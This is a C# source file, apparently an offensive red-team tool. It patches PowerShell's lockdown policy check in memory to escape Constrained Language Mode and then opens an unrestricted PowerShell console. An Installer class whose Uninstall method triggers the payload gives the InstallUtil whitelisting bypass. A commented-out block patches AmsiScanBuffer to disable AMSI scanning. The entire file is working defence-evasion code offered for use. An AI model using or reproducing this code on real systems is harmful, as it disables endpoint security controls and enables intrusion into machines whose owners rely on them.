﻿using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace n0iseBypassCLM
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        public static void Main(string[] args)
        {
            justDoIt();
        }

        public static void justDoIt()
        {
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // ensure jit compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // get jim compiled pointer
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // write instructions
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            // amsi bypas
            /*
            var amsi = LoadLibrary("amsi.dll");
            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);

            if (System.IntPtr.Size == 8)
            {
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
            } else
            {
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
            }
            */

            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            MainClass.justDoIt();
        }
    }

}
